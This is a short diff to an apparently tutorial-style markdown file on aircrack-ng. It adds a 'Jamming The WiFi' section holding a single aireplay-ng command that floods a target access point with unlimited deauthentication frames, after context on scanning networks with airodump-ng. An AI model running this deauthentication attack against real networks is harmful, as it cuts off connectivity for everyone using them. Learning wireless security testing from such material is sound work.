@@ -43,3 +43,9 @@ Airmon-ng is used to read all the packets of data even if they are not sent to u
 airodump-ng wlan0mon
 ```
 After doing this you will able to see a interface that will show you wifi network around you which are available and with this you will able to see many other columns such as CH (channel), bssid and many more.
+
+  ## Jamming The WiFi
+
+```sh
+aireplay-ng --deauth 0 -a <target_mac> wlan0mon
+```
